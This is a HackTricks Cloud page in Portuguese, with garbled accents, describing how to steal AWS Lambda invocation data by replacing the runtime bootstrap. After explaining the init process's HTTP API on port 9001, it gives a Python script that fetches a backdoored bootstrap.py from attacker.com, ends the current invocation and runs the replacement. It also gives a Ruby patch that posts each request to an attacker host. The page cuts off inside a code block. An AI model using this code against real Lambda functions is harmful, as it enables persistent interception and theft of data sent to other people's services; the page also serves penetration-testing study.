# AWS - Roubar Requisi√ß√µes Lambda

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou se deseja acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no Github.

</details>

## Introdu√ß√£o <a href="#python-runtime" id="python-runtime"></a>

Este ataque pressup√µe que voc√™ tenha algum tipo de **acesso a uma Lambda em execu√ß√£o**.\
Al√©m disso, algo importante a ser observado √© que **as invoca√ß√µes da Lambda n√£o est√£o completamente separadas umas das outras, mas s√£o isoladas**. Elas podem ser executadas, embora n√£o simultaneamente, no mesmo ambiente de execu√ß√£o. Com isso em mente, vamos come√ßar a dissecar esse ambiente.

### Isolamento

O isolamento da Lambda usa os cgroups:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (4).png" alt=""><figcaption></figcaption></figure>

Como o prefixo 'sandbox' n√£o corresponde a nenhum mecanismo de cont√™iner comum (docker, podman, LXD, rkt), pode ser um mecanismo de cont√™iner propriet√°rio, que pode estar usando internamente um tempo de execu√ß√£o de cont√™iner de c√≥digo aberto como o [runC](https://github.com/opencontainers/runc).

### Como as Lambdas funcionam  <a href="#python-runtime" id="python-runtime"></a>

Esta parece ser a arquitetura da Lambda em Python:

<figure><img src="../../../../.gitbook/assets/image (2) (6).png" alt=""><figcaption></figcaption></figure>

1. Um processo fora do cont√™iner, referido como o "**slicer**" no bin√°rio init, envia eventos de invoca√ß√£o para o processo **init** via mem√≥ria compartilhada.
2. O processo init configura um servidor HTTP na porta 9001 (codificada em duro), com v√°rios endpoints expostos:
   1. /2018-06-01/runtime/invocation/**next** ‚Äì obter o pr√≥ximo evento de invoca√ß√£o
   2. /2018-06-01/runtime/invocation/{invoke-id}/**response** ‚Äì retornar a resposta do manipulador para a invoca√ß√£o
   3. /2018-06-01/runtime/invocation/{invoke-id}/**error** ‚Äì retornar um erro de execu√ß√£o
3.  No `bootstrap.py`, o seguinte loop **consulta o processo init para um novo evento**, e ent√£o **chama a fun√ß√£o do usu√°rio** para lidar com ele (aqui, o manipulador de solicita√ß√µes que voc√™ enviou √© executado).\


    <figure><img src="../../../../.gitbook/assets/image (11) (4).png" alt=""><figcaption></figcaption></figure>
4. A **resposta do manipulador √© ent√£o enviada de volta para o processo init** atrav√©s de um dos seguintes endpoints:
   1. `/{invoke-id}/response` ‚Äì se o manipulador do usu√°rio foi executado com sucesso
   2. `/{invoke-id}/error` ‚Äì se uma exce√ß√£o foi levantada durante o tratamento da invoca√ß√£o

## Resumo da t√©cnica <a href="#python-runtime" id="python-runtime"></a>

√â poss√≠vel **substituir o script de inicializa√ß√£o** por c√≥digo malicioso para ser capaz de **interceptar dados** enviados para a fun√ß√£o Lambda.\
Observe que **outros mecanismos em outras linguagens** t√™m outro **script de inicializa√ß√£o** escrito nessa linguagem, ent√£o isso pode ser feito **tamb√©m em outras lambdas usando outras linguagens**, n√£o apenas em Python.

## Python <a href="#python-runtime" id="python-runtime"></a>

A partir da Lambda, baixe **`/var/runtime/bootstrap.py`** (ou apenas inicie **sua pr√≥pria lambda** e obtenha-o) e adicione a porta dos fundos que vazar√° todos os dados enviados para a Lambda. Voc√™ s√≥ precisa adicionar algumas linhas, como:

<figure><img src="../../../../.gitbook/assets/image (2) (1) (3).png" alt=""><figcaption></figcaption></figure>

### Substituindo o tempo de execu√ß√£o

Agora, com o novo **`boostrap.py` criado**, √© poss√≠vel **baix√°-lo**, **encerrar a invoca√ß√£o atual da lambda** e execut√°-lo para **substituir** o leg√≠timo:

```python
import os
from urllib import request

# Baixar o bootstrap.py do seu servidor
r = request.urlopen('http://attacker.com/bootstrap.py')
with open('/tmp/bootstrap.py', 'w') as f:
    f.write(r.read().decode('utf-8'))

# Obter o ID da invoca√ß√£o e encerr√°-lo
req = request.urlopen("http://127.0.0.1:9001/2018-06-01/runtime/invocation/next")
inv_id = req.headers["Lambda-Runtime-Aws-Request-Id"]
req = request.Request(f"http://127.0.0.1:9001/2018-06-01/runtime/invocation/{inv_id}/response", data=b"null")
req.add_header("Content-Type", "application/x-www-form-urlencoded")
request.urlopen(req)

# Iniciar o seu bootstrap.py
os.system("python3 /tmp/bootstrap.py")
```

Ou voc√™ tamb√©m pode usar o [twist\_runtime.py](https://github.com/twistlock/lambda-persistency-poc/blob/master/poc/twist\_runtime.py), que encerrar√° a invoca√ß√£o como feito anteriormente, executar√° o novo bootstrap e exfiltrar√° as informa√ß√µes.

{% hint style="warning" %}
Se uma fun√ß√£o lambda n√£o for usada por 5-15 minutos, ela ser√° desligada, e todas as altera√ß√µes ser√£o perdidas na pr√≥xima vez que for invocada.
{% endhint %}

## Tempo de execu√ß√£o Ruby <a href="#ruby-runtime" id="ruby-runtime"></a>

Em Ruby, o arquivo que voc√™ deseja adicionar a porta dos fundos √© o arquivo **`/var/runtime/lib/runtime.rb`** (obt√™-lo do sistema ou executando sua pr√≥pria lambda).

Adicionar uma porta dos fundos √© t√£o simples quanto na vers√£o Python:

```ruby
# Adicionar um require no in√≠cio
require 'json'
require 'net/http'
[...]
# No loop onde a invoca√ß√£o √© tratada
begin 
    context = lambdaContext.new(raw_request)
    uri = URI('http://attacker:80/leak')
    Net::HTTP.post(uri,JSON.generate(request))
    [...]
```

Ent√£o, voc√™ s√≥ precisa fazer o que fez na vers√£o Python com apenas uma mudan√ßa:

* **Baixar a porta dos fundos em um diret√≥rio**
* **Criar um link simb√≥lico** `/var/runtime/lib/*` com o diret√≥rio onde a porta dos fundos est√°
* Encerrar a invoca√ß√£o atual da lambda

```ruby
# Voc√™ pode obter um